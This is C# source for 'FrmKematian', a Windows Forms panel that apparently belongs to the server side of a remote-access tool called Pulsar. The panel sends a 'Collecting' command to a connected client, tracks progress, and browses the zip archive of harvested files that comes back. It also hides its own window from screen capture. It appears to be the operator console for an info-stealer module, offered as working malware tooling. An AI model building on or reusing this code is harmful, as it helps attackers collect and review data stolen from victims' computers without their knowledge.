using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Common.Messages.Monitoring.Kematian;
using Pulsar.Common.Enums;
using Pulsar.Server.Messages;
using System.IO;
using System.IO.Compression;
using Pulsar.Server.Controls;
namespace Pulsar.Server.Forms
{
    public partial class FrmKematian : Form
    {
        private readonly Client _client;
        private readonly KematianHandler _handler;
        private string _currentZipPath;
        private readonly ImageList _imageList;
        private readonly ContextMenuStrip _contextMenuStrip;
        private ZipArchive _currentArchive;
        private Stack<string> _directoryHistory = new Stack<string>();
        private string _currentDirectory = "";
        private Timer _tabVisibilityTimer;
        public FrmKematian(Client client, KematianHandler handler)
        {
            _client = client ?? throw new ArgumentNullException(nameof(client));
            _handler = handler ?? throw new ArgumentNullException(nameof(handler));

            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);


            aeroListView1.View = View.Details;
            aeroListView1.FullRowSelect = true;
            aeroListView1.MultiSelect = false;
            aeroListView1.Columns.Add("Name", 200);
            aeroListView1.Columns.Add("Size", 80, HorizontalAlignment.Right);
            aeroListView1.Columns.Add("Type", 100);


            _imageList = new ImageList();
            string imagesPath = Path.Combine(Application.StartupPath, "Images");


            try
            {
                _imageList.Images.Add(Image.FromFile(Path.Combine(imagesPath, "folder.png"))); 
                _imageList.Images.Add(Image.FromFile(Path.Combine(imagesPath, "file.png"))); 
                _imageList.Images.Add(Image.FromFile(Path.Combine(imagesPath, "text.png"))); 
            }
            catch (Exception)
            {

                _imageList.Images.Add(new Bitmap(16, 16)); 
                _imageList.Images.Add(new Bitmap(16, 16)); 
                _imageList.Images.Add(new Bitmap(16, 16)); 
            }

            aeroListView1.SmallImageList = _imageList;


            _contextMenuStrip = new ContextMenuStrip();
            var viewItem = new ToolStripMenuItem("View");
            viewItem.Click += ViewItem_Click;
            _contextMenuStrip.Items.Add(viewItem);

            aeroListView1.ContextMenuStrip = _contextMenuStrip;
            aeroListView1.DoubleClick += AeroListView1_DoubleClick;


            dotNetBarTabControl1.Visible = false;


            dotNetBarTabControl1.ShowCloseButtons = true;


            dotNetBarTabControl1.TabClosed += DotNetBarTabControl1_TabClosed;


            _tabVisibilityTimer = new Timer();
            _tabVisibilityTimer.Interval = 500; 
            _tabVisibilityTimer.Tick += TabVisibilityTimer_Tick;
            _tabVisibilityTimer.Start();

            ResizeControls();

            button1.Enabled = true;
            button2.Enabled = false;
            UpdateStatus(KematianStatus.Idle);

            _handler.SetKematianForm(this);
        }
        private void ResizeControls()
        {

            if (dotNetBarTabControl1.Visible)
            {

                int availableHeight = this.ClientSize.Height - aeroListView1.Top - statusLabel.Height - 30;
                int halfHeight = availableHeight / 2;

                aeroListView1.Height = halfHeight;
                dotNetBarTabControl1.Top = aeroListView1.Bottom + 5;
                dotNetBarTabControl1.Height = halfHeight;
                dotNetBarTabControl1.Width = aeroListView1.Width;
            }
            else
            {

                int availableHeight = this.ClientSize.Height - aeroListView1.Top - statusLabel.Height - 30;
                aeroListView1.Height = availableHeight;
            }
        }
        protected override void OnResize(EventArgs e)
        {
            base.OnResize(e);
            ResizeControls();
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);


            if (_tabVisibilityTimer != null)
            {
                _tabVisibilityTimer.Stop();
                _tabVisibilityTimer.Dispose();
                _tabVisibilityTimer = null;
            }


            if (_currentArchive != null)
            {
                _currentArchive.Dispose();
                _currentArchive = null;
            }
        }
        private void ViewItem_Click(object sender, EventArgs e)
        {
            OpenSelectedItem();
        }
        private void AeroListView1_DoubleClick(object sender, EventArgs e)
        {
            OpenSelectedItem();
        }

        private void OpenSelectedItem()
        {
            if (aeroListView1.SelectedItems.Count == 0)
                return;

            ListViewItem selectedItem = aeroListView1.SelectedItems[0];
            string itemType = selectedItem.SubItems[2].Text.ToLower();
            string itemName = selectedItem.Text;

            if (itemName == "..")
            {

                if (_directoryHistory.Count > 0)
                {
                    _currentDirectory = _directoryHistory.Pop();
                    DisplayDirContents();
                }
                return;
            }

            if (itemType == "directory")
            {

                _directoryHistory.Push(_currentDirectory);

                if (string.IsNullOrEmpty(_currentDirectory))
                    _currentDirectory = itemName;
                else

                    _currentDirectory = (_currentDirectory + "/" + itemName).Replace("//", "/");

                DisplayDirContents();
            }
            else if (itemType == "text file" || itemName.EndsWith(".txt") || 
                     itemName.EndsWith(".log") || itemName.EndsWith(".json"))
            {

                OpenTxtFile(selectedItem.Tag as string);
            }
        }
        private void OpenTxtFile(string fullPath)
        {
            if (string.IsNullOrEmpty(fullPath) || _currentArchive == null)
                return;

            try
            {

                var entry = _currentArchive.GetEntry(fullPath);
                if (entry == null)
                    return;


                string fileContent;
                using (Stream stream = entry.Open())
                using (StreamReader reader = new StreamReader(stream))
                {
                    fileContent = reader.ReadToEnd();
                }


                string fileName = Path.GetFileName(fullPath);


                TabPage tabPage = new TabPage(fileName);


                RichTextBox textBox = new RichTextBox();
                textBox.Dock = DockStyle.Fill;
                textBox.ReadOnly = true;
                textBox.Text = fileContent;

                tabPage.Controls.Add(textBox);


                if (dotNetBarTabControl1.TabCount == 1 && dotNetBarTabControl1.TabPages[0].Text == "tabPage2")
                {
                    dotNetBarTabControl1.TabPages.Clear();
                }


                dotNetBarTabControl1.TabPages.Add(tabPage);
                dotNetBarTabControl1.SelectedTab = tabPage;


                dotNetBarTabControl1.Visible = true;
                ResizeControls();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error opening file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void DisplayDirContents()
        {
            if (_currentArchive == null)
                return;

            aeroListView1.Items.Clear();


            if (!string.IsNullOrEmpty(_currentDirectory))
            {
                ListViewItem backItem = new ListViewItem("..");
                backItem.SubItems.Add("");
                backItem.SubItems.Add("Directory");
                backItem.ImageIndex = 0; 
                aeroListView1.Items.Add(backItem);
            }


            HashSet<string> directories = new HashSet<string>();
            List<ZipArchiveEntry> files = new List<ZipArchiveEntry>();

            string dirPrefix = string.IsNullOrEmpty(_currentDirectory) ? "" : _currentDirectory + "/";




            foreach (ZipArchiveEntry entry in _currentArchive.Entries)
            {
                string entryFullName = entry.FullName.Replace('\\', '/');








                if (!entryFullName.StartsWith(dirPrefix))
                    continue;


                if (entryFullName == dirPrefix)
                    continue;

                string relativePath = entryFullName.Substring(dirPrefix.Length);
                int slashIndex = relativePath.IndexOf('/');

                if (slashIndex >= 0)
                {

                    string dirName = relativePath.Substring(0, slashIndex);
                    directories.Add(dirName);
                }
                else
                {

                    files.Add(entry);
                }
            }


            foreach (string dir in directories.OrderBy(d => d))
            {
                ListViewItem item = new ListViewItem(dir);
                item.SubItems.Add("");
                item.SubItems.Add("Directory");
                item.ImageIndex = 0; 
                aeroListView1.Items.Add(item);
            }


            foreach (ZipArchiveEntry entry in files.OrderBy(f => f.Name))
            {
                ListViewItem item = new ListViewItem(entry.Name);
                item.SubItems.Add(FormatFileSize(entry.Length));


                string extension = Path.GetExtension(entry.Name).ToLower();
                if (extension == ".txt" || extension == ".log" || extension == ".json")
                {
                    item.SubItems.Add("Text File");
                    item.ImageIndex = 2; 
                }
                else
                {
                    item.SubItems.Add("File" + extension);
                    item.ImageIndex = 1; 
                }


                item.Tag = entry.FullName;

                aeroListView1.Items.Add(item);
            }
        }
        public void DisplayZipContents(string zipPath)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<string>(DisplayZipContents), zipPath);
                return;
            }


            if (_currentZipPath == zipPath && _currentArchive != null)
            {

                _currentDirectory = "";
                _directoryHistory.Clear();
                DisplayDirContents();
                return;
            }

            _currentZipPath = zipPath;
            _currentDirectory = "";
            _directoryHistory.Clear();
            aeroListView1.Items.Clear();


            dotNetBarTabControl1.TabPages.Clear();
            dotNetBarTabControl1.Visible = false;
            ResizeControls();

            try
            {

                if (_currentArchive != null)
                {
                    _currentArchive.Dispose();
                    _currentArchive = null;
                }


                _currentArchive = ZipFile.OpenRead(zipPath);


                DisplayDirContents();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error opening zip file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private string FormatFileSize(long size)
        {
            string[] sizes = { "B", "KB", "MB", "GB" };
            double formattedSize = size;
            int order = 0;

            while (formattedSize >= 1024 && order < sizes.Length - 1)
            {
                order++;
                formattedSize = formattedSize / 1024;
            }

            return $"{formattedSize:0.##} {sizes[order]}";
        }
        public void SetZipReadyStatus()
        {
            if (InvokeRequired)
            {
                Invoke(new Action(SetZipReadyStatus));
                return;
            }

            statusLabel.Text = "Status: Zip file ready";
        }
        private void start_Click(object sender, EventArgs e)
        {
            try
            {
                button1.Enabled = false;
                button2.Enabled = true;
                progressBar1.Value = 0;
                UpdateStatus(KematianStatus.Collecting);


                aeroListView1.Items.Clear();
                dotNetBarTabControl1.TabPages.Clear();
                dotNetBarTabControl1.Visible = false;
                ResizeControls();


                _currentDirectory = "";
                _directoryHistory.Clear();


                if (_currentArchive != null)
                {
                    _currentArchive.Dispose();
                    _currentArchive = null;
                }


                _client.Send(new SetKematianStatus { Status = KematianStatus.Collecting });
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error starting Kematian: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                button1.Enabled = true;
                button2.Enabled = false;
                UpdateStatus(KematianStatus.Failed);
            }
        }
        private void cancel_Click(object sender, EventArgs e)
        {
            try
            {
                button2.Enabled = false;
                button1.Enabled = true;
                UpdateStatus(KematianStatus.Idle);

                _client.Send(new SetKematianStatus { Status = KematianStatus.Idle });
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error cancelling Kematian: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void UpdateProgress(int percentage)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<int>(UpdateProgress), percentage);
                return;
            }

            progressBar1.Value = percentage;
        }

        public void UpdateStatus(KematianStatus status)
        {
            if (InvokeRequired)
            {
                Invoke(new Action<KematianStatus>(UpdateStatus), status);
                return;
            }

            statusLabel.Text = $"Status: {status}";

            if (status == KematianStatus.Completed || status == KematianStatus.Failed)
            {
                button2.Enabled = false;
                button1.Enabled = true;

                if (status == KematianStatus.Completed)
                {
                    progressBar1.Value = 100;
                }
            }
        }
        private void DotNetBarTabControl1_TabClosed(object sender, TabPageEventArgs e)
        {

            if (dotNetBarTabControl1.TabCount <= 0)
            {
                dotNetBarTabControl1.Visible = false;
                ResizeControls();
            }
        }

        private void TabVisibilityTimer_Tick(object sender, EventArgs e)
        {

            if (dotNetBarTabControl1.TabCount == 0 && dotNetBarTabControl1.Visible)
            {
                dotNetBarTabControl1.Visible = false;
                ResizeControls();
            }
        }
    }
}
